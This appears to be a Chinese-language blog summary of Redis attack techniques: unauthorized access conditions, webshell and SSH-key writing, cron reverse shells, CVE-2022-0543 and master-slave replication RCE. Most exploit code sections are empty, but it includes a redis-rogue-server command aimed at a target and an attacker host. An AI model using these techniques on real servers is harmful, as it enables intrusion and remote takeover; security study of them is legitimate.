Redis漏洞总结

Redis漏洞总结

常见命令

注：redis不区分大小写

配置文件

安全模式起作用需要同时满足两个条件：

  • redis没有开启登录认证
  • redis没有绑定ip

redis默认是未开启认证，开启安全模式的

未授权访问应用条件

  1. bind 127.0.0.1 处于注释状态
  2. protected-mode no
  3. requirepass 处于注释状态

写Webshell

应用条件：知道Web目录，并且可读写

写入RSA秘钥

前提条件

  • redis以root账号启动
  • 服务器必须允许密钥登陆
  • protected-mode处于关闭状态

写定时任务反弹shell

CVE-2022-0543-沙箱绕过

攻击机:172.30.152.248

靶机:172.30.158.168

影响版本

2.2 <= redis < 5.0.13 2.2 <= redis < 6.0.15 2.2 <= redis < 6.2.5

exp

复现

RCE-主从复制getshell

主从模式为使用两台Redis主机,一台为主机,一台为从机,一台负责读,一台负责写,主从模式的读写分离可以缓解服务器上的流量压力,牺牲空间换取效率.

漏洞成因

Redis 版本(4.x~5.0.5)（新增模块功能，可以通过C语言并编译出恶意.so文件）

先决条件：

Redis 版本(4.x~5.0.5)（新增模块功能，可以通过C语言并编译出恶意.so文件）

root权限启动redis

自动化脚本：

https://github.com/n0b0dyCN/redis-rogue-server

python redis-rogue-server.py --rhost 192.168.52.251 --lhost 192.168.52.128
